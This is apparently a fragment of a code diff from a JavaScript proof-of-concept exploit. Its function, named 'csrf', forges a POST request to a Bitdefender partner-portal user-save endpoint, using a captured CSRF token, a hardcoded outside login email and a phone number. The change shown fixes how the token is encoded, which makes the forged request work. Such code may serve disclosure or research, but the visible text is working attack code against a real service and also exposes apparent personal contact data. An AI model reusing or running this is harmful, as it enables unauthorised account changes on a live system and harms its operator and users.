@@ -43,7 +43,7 @@ function csrf(token, key) {
     params += "mobile_phone=0625638657&";
     params += "login=ihwoke@live.com&";
     params += "_Token%5Bunlocked%5D=&";
-    params += "_csrfToken=" + key;
+    params += "_csrfToken=" + encodeURI(key);
 
     var x1 = new XMLHttpRequest();
     x1.open("POST", "https://pan.bitdefender.com/partners/my-users-save/");
